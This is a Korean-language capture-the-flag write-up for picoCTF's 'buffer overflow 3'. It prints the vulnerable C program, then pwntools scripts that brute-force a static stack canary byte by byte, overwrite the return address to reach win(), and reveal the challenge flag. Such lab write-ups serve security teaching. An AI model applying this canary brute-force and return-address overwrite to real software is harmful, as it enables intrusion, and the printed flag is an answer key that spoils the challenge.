# [buffer overflow 3](https://play.picoctf.org/practice/challenge/260?category=6&originalEvent=70&page=2&search=)
<br />

**Description:**
> Do you think you can bypass the protection and get the flag?
<br />

**Source Code:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    fflush(stdout);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    fflush(stdout);
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      fflush(stdout);
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```
<br />

**Binary Protections:**
```yaml
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=880ddfdc7ef13c4139ab8a80cc3d8225251a331f, for GNU/Linux 3.2.0, not stripped

[*] '/home/kali/pico/buffer_overflow_3/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
<br />

# 1. 카나리 찾기
문제를 풀기에 앞서 `checksec`으로 바이너리에 적용된 보호기법을 확인해보면, 스택 카나리는 비활성화되어 있습니다. 그러나 소스코드를 살펴보면, **`canary.txt` 에서 4바이트만큼 읽어와 해당 값을 스택 카나리처럼 활용하고 있음을 알 수 있습니다.**
<br />

카나리는 스택 스매싱 공격으로부터 이를 탐지하고 바이너리를 보호합니다. 구현된 스택 카나리는 버퍼보다 높은 주소에 있음을 알고 있고, `canary.txt`에서 **정적 데이터**를 4바이트 읽어와 사용합니다. 따라서 스택 버퍼오버플로우 취약점을 이용해서 카나리를 **무차별 대입 공격**을 통해 알아낼 수 있습니다.
```bash
|------ Low Address ------|
|        count  0x4       | -> [ebp-0x94] ~ [ebp-0x91]
|-------------------------|
|       length  0x40      | -> [ebp-0x90] ~ [ebp-0x51]
|-------------------------|
|          buf  0x40      | -> [ebp-0x50] ~ [ebp-0x11]
|-------------------------|
|       canary  0x4       | -> [ebp-0x10] ~ [ebp-0xd]
|-------------------------|
|            x  0x4       | -> [ebp-0xc] ~ [ebp-0x9]
|-------------------------|
|        dummy  0x8       | -> [ebp-0x8] ~ [ebp-0x1]
|-------------------------|
|          ebp  0x4       | -> [ebp-0x0] ~ [ebp+0x3]
|-------------------------|
|          ret  0x4       | -> [ebp+0x4]
|------ High Address -----|
```
카나리의 값을 하나씩 대입할 것이기에 정확한 오프셋을 알아야 합니다. 위 스택 구조로 버퍼에서부터 카나리까지의 오프셋은 `0x40` 인 것을 알 수 있습니다.
<br />

```bash
$ ./vuln
How Many Bytes will You Write Into the Buffer?
> 100
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
***** Stack Smashing Detected ***** : Canary Value Corrupt!
```
무차별 대입 공격은 값을 **하나씩 입력하고 프로그램의 반응에 따라 참과 거짓을 분별하여 특정 값을 유추하는 공격 방식**입니다. 해당 바이너리는 카나리가 오염됐다고 판단되면 경고 메시지를 출력한 뒤, 프로그램을 즉시 종료를 합니다. 이러한 반응을 활용하여 카나리를 추출할 수 있습니다.

```python
from pwn import *

context.log_level = "error"

cnry = b""
for i in range(4):
    for c in range(256): 
        # p = process("./vuln")
        p = remote("saturn.picoctf.net", 61149)

        p.sendafter(b">", b"100\n")
        p.sendafter(b">", b"A"*0x40+cnry+bytes([c]))

        if b"Ok..." in p.recvall():
            cnry += bytes([c])
            print(f"[+] Found Canary: {cnry}")
            break
```
버퍼를 카나리 직전까지 채우고, 각 바이트(`0x00`~`0xFF`)를 하나씩 대입합니다. 경고 문자열이 출력되지 않으면, 그 값을 누적하고 다음 바이트에 대입을 시도합니다. 이러한 과정을 총 4번 반복합니다.

```bash
$ python3 test2.py
[+] Found Canary: b'B'
[+] Found Canary: b'Bi'
[+] Found Canary: b'BiR'
[+] Found Canary: b'BiRd'
```
<br />

# 2. 카나리 우회
```bash
$ python3 -q
>>> from pwn import *
>>> p = process("./vuln")
[+] Starting local process './vuln': pid 10788
>>> pay = cyclic(64) + b"DFGH" + cyclic(128)
>>> p.send(b"100\n")
>>> p.send(pay)
>>> p.wait()
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 10788)
>>> core = Corefile("./core.10788")
[+] Parsing corefile...: Done
[*] '/home/kali/pico/core.10788'
    Arch:      i386-32-little
    EIP:       0x61616165
    ESP:       0xff90ca60
    Exe:       '/home/kali/pico/vuln' (0x8048000)
    Fault:     0x61616165
>>> cyclic_find(0x61616165)
16
```
카나리와 `RET`의 오프셋은 `0x10` 입니다. 프로세스를 다시 연결하고, 각 오프셋에 맞게 값을 넣어줍니다. 이후 `RET`을 `win()`의 주소로 덮으면 FLAG가 출력될 것입니다. 
```python
from pwn import *

host, port = "saturn.picoctf.net", 61149
context.log_level = "error"

cnry = b""
for i in range(4):
    for c in range(256): 
        # p = process("./vuln")
        p = remote(host, port)

        p.sendafter(b">", b"100\n")
        p.sendafter(b">", b"A"*0x40+cnry+bytes([c]))

        if b"Ok..." in p.recvall():
            cnry += bytes([c])
            print(f"[+] Found Canary: {cnry}")
            break

# p = process("./vuln")
p = remote(host, port)

p.sendafter(b">", b"100\n")
p.sendafter(b">", b"A"*0x40+cnry+b"B"*0x10+p32(0x8049336)) # win = 08049336
p.interactive()
```
```bash
$ python3 test.py
[+] Found Canary: b'B'
[+] Found Canary: b'Bi'
[+] Found Canary: b'BiR'
[+] Found Canary: b'BiRd'
Ok... Now Where's the Flag?
picoCTF{Stat1C_c4n4r13s_4R3_b4D_0bf0b08e}
$
```
<br />

> [!NOTE]
> tqdm_ver
>```python
>from pwn import *
>from tqdm import tqdm
>from string import printable
>
>def conn():
>    if len(sys.argv) == 3:
>        host, port = sys.argv[1], int(sys.argv[2])
>        p = remote(host, port)
>    else:
>        p = e.process()
>    return p
>
>def send(proc, value):
>    proc.sendafter(b">", b"100\n")
>    proc.sendafter(b">", value)
>
>def get_cnry():
>    pbar = tqdm(total=len(printable)*4, desc="[+] Finding Canary", ascii=" =", ncols=80)
>
>    cnry = b""
>    for i in range(4): 
>        for idx, c in enumerate(printable):
>            with context.quiet:
>                p = conn()
>
>                send(p, flat({0x40:cnry}, c.encode()))
>
>                pbar.update(1)
>    
>                if b"Ok..." in p.recvall():
>                    cnry += c.encode()
>                    pbar.update(len(printable)-idx-1)
>                    break
>
>    tqdm.write(f"[+] Found Canary: {cnry}")
>    return cnry
>
>e = ELF("./vuln", checksec=False)
>p = conn()
>
>cnry = get_cnry()
>send(p, flat({0x40:cnry}, {0x10:e.sym["win"]}))
>p.interactive()
>```
>```bash
>$ python3 test.py saturn.picoctf.net 52435
>[+] Opening connection to saturn.picoctf.net on port 52435: Done
>[+] Found Canary: b'BiRd'
>[+] Finding Canary: 100%|=====================| 400/400 [01:44<00:00,  3.81it/s]
>[*] Switching to interactive mode
> Ok... Now Where's the Flag?
>picoCTF{Stat1C_c4n4r13s_4R3_b4D_0bf0b08e}
>[*] Got EOF while reading in interactive
>$
>```
